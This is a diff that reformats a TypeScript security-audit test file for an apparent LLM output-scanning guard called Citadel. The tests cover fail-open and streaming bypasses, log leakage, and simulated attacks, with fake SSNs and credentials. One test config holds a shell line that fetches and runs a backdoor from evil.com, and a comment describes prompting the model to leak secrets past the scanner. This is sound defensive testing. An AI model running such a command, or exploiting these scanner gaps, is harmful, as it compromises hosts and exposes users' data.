@@ -69,7 +69,9 @@ describe("SECURITY AUDIT: Fail-Open Bypass", () => {
       const scanResult = { ok: false, error: "Timeout" };
 
       // Test with failOpen=false
-      const result1 = handleOutboundScanFailure(scanResult, { failOpen: false });
+      const result1 = handleOutboundScanFailure(scanResult, {
+        failOpen: false,
+      });
       // Test with failOpen=true
       const result2 = handleOutboundScanFailure(scanResult, { failOpen: true });
 
@@ -102,8 +104,12 @@ describe("SECURITY AUDIT: Fail-Open Bypass", () => {
     it("FIXED: falls back to failOpen when failOpenOutbound not specified", () => {
       const scanResult = { ok: false, error: "Timeout" };
 
-      const result1 = handleOutboundScanFailure_FIXED(scanResult, { failOpen: false });
-      const result2 = handleOutboundScanFailure_FIXED(scanResult, { failOpen: true });
+      const result1 = handleOutboundScanFailure_FIXED(scanResult, {
+        failOpen: false,
+      });
+      const result2 = handleOutboundScanFailure_FIXED(scanResult, {
+        failOpen: true,
+      });
 
       expect(result1.blocked).toBe(true); // Respects failOpen=false
       expect(result2.blocked).toBe(false); // Respects failOpen=true
@@ -126,7 +132,10 @@ describe("SECURITY AUDIT: Streaming Response Bypass", () => {
 
   function handleHttpResponseSending(
     event: { content: string; isStreaming?: boolean },
-    config: { outboundBlockOnUnsafe: boolean; blockStreamingResponses?: boolean },
+    config: {
+      outboundBlockOnUnsafe: boolean;
+      blockStreamingResponses?: boolean;
+    },
     scanFn: (text: string) => Promise<{ safe: boolean }>,
   ): Promise<{ block: boolean; reason?: string } | undefined> {
     // CURRENT VULNERABLE BEHAVIOR (from index.ts line 1409):
@@ -145,7 +154,10 @@ describe("SECURITY AUDIT: Streaming Response Bypass", () => {
 
   function handleHttpResponseSending_FIXED(
     event: { content: string; isStreaming?: boolean },
-    config: { outboundBlockOnUnsafe: boolean; blockStreamingResponses?: boolean },
+    config: {
+      outboundBlockOnUnsafe: boolean;
+      blockStreamingResponses?: boolean;
+    },
     scanFn: (text: string) => Promise<{ safe: boolean }>,
     logger?: { warn: (msg: string) => void },
   ): Promise<{ block: boolean; reason?: string } | undefined> {
@@ -189,7 +201,8 @@ describe("SECURITY AUDIT: Streaming Response Bypass", () => {
 
     it("VULNERABILITY: attacker can exfiltrate via streaming", async () => {
       // Simulating data exfiltration attack
-      const sensitiveData = "SSN: 123-45-6789, Credit Card: 4111-1111-1111-1111";
+      const sensitiveData =
+        "SSN: 123-45-6789, Credit Card: 4111-1111-1111-1111";
       const scanFn = vi.fn().mockResolvedValue({ safe: false }); // Would detect this
 
       const event = { content: sensitiveData, isStreaming: true };
@@ -218,9 +231,16 @@ describe("SECURITY AUDIT: Streaming Response Bypass", () => {
     it("FIXED: blocks streaming when blockStreamingResponses=true", async () => {
       const scanFn = vi.fn();
       const event = { content: "sensitive", isStreaming: true };
-      const config = { outboundBlockOnUnsafe: true, blockStreamingResponses: true };
+      const config = {
+        outboundBlockOnUnsafe: true,
+        blockStreamingResponses: true,
+      };
 
-      const result = await handleHttpResponseSending_FIXED(event, config, scanFn);
+      const result = await handleHttpResponseSending_FIXED(
+        event,
+        config,
+        scanFn,
+      );
 
       expect(result?.block).toBe(true);
       expect(result?.reason).toBe("streaming_responses_not_scannable");
@@ -230,7 +250,10 @@ describe("SECURITY AUDIT: Streaming Response Bypass", () => {
       const scanFn = vi.fn();
       const logger = { warn: vi.fn() };
       const event = { content: "sensitive", isStreaming: true };
-      const config = { outboundBlockOnUnsafe: true, blockStreamingResponses: false };
+      const config = {
+        outboundBlockOnUnsafe: true,
+        blockStreamingResponses: false,
+      };
 
       await handleHttpResponseSending_FIXED(event, config, scanFn, logger);
 
@@ -403,7 +426,8 @@ describe("SECURITY AUDIT: Log Content Leakage", () => {
 
   describe("Current Vulnerable Behavior", () => {
     it("VULNERABILITY: sensitive content appears in logs", () => {
-      const sensitiveInput = "My password is SuperSecret123! and my SSN is 123-45-6789";
+      const sensitiveInput =
+        "My password is SuperSecret123! and my SSN is 123-45-6789";
 
       logScanInput_VULNERABLE("/v1/chat/completions", sensitiveInput);
 
@@ -533,7 +557,8 @@ describe("SECURITY AUDIT: Attack Scenario Simulations", () => {
       // Attacker crafts a prompt that causes the model to output sensitive data
       // The response is streamed, bypassing output scanning
 
-      const sensitiveResponse = "Here are the database credentials: postgres://admin:secret@db.internal:5432";
+      const sensitiveResponse =
+        "Here are the database credentials: postgres://admin:secret@db.internal:5432";
 
       // Simulate the vulnerability
       const mockScanOutput = vi.fn().mockResolvedValue({ safe: false });
@@ -554,7 +579,8 @@ describe("SECURITY AUDIT: Attack Scenario Simulations", () => {
       // Attacker causes Citadel to be unavailable (DoS)
       // Then sends malicious responses that would normally be blocked
 
-      const maliciousOutput = "Here is your private key: -----BEGIN RSA PRIVATE KEY-----";
+      const maliciousOutput =
+        "Here is your private key: -----BEGIN RSA PRIVATE KEY-----";
 
       // Simulate Citadel being unavailable
       const scanResult = { ok: false, error: "Connection refused" };
@@ -583,7 +609,10 @@ describe("SECURITY AUDIT: Attack Scenario Simulations", () => {
       const maliciousConfig = {
         autoStart: true,
         citadelBin: "/bin/sh",
-        citadelArgs: ["-c", "wget http://evil.com/backdoor.sh -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd"],
+        citadelArgs: [
+          "-c",
+          "wget http://evil.com/backdoor.sh -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd",
+        ],
       };
 
       // Current code would execute this on startup!
@@ -608,11 +637,18 @@ describe("SECURITY AUDIT: Regression Tests", () => {
 
   describe("Fail-open fix doesn't break normal operation", () => {
     it("allows outbound when scan succeeds", () => {
-      function handleOutbound(scanResult: { ok: boolean; safe: boolean }, config: { failOpenOutbound: boolean }) {
+      function handleOutbound(
+        scanResult: { ok: boolean; safe: boolean },
+        config: { failOpenOutbound: boolean },
+      ) {
         if (!scanResult.ok) {
-          return config.failOpenOutbound ? { blocked: false } : { blocked: true };
+          return config.failOpenOutbound
+            ? { blocked: false }
+            : { blocked: true };
         }
-        return scanResult.safe ? { blocked: false } : { blocked: true, reason: "unsafe" };
+        return scanResult.safe
+          ? { blocked: false }
+          : { blocked: true, reason: "unsafe" };
       }
 
       // Normal successful scan
@@ -625,11 +661,18 @@ describe("SECURITY AUDIT: Regression Tests", () => {
     });
 
     it("still blocks unsafe content when scan succeeds", () => {
-      function handleOutbound(scanResult: { ok: boolean; safe: boolean }, config: { failOpenOutbound: boolean }) {
+      function handleOutbound(
+        scanResult: { ok: boolean; safe: boolean },
+        config: { failOpenOutbound: boolean },
+      ) {
         if (!scanResult.ok) {
-          return config.failOpenOutbound ? { blocked: false } : { blocked: true };
+          return config.failOpenOutbound
+            ? { blocked: false }
+            : { blocked: true };
         }
-        return scanResult.safe ? { blocked: false } : { blocked: true, reason: "unsafe" };
+        return scanResult.safe
+          ? { blocked: false }
+          : { blocked: true, reason: "unsafe" };
       }
 
       const result = handleOutbound(
@@ -644,7 +687,11 @@ describe("SECURITY AUDIT: Regression Tests", () => {
 
   describe("Binary validation doesn't block legitimate citadel", () => {
     it("allows standard citadel installation paths", () => {
-      const ALLOWED_PATTERNS = [/^citadel$/, /^\.\/citadel$/, /^\/[\w.\/-]+\/citadel$/];
+      const ALLOWED_PATTERNS = [
+        /^citadel$/,
+        /^\.\/citadel$/,
+        /^\/[\w.\/-]+\/citadel$/,
+      ];
 
       function isAllowed(bin: string) {
         return ALLOWED_PATTERNS.some((p) => p.test(bin));
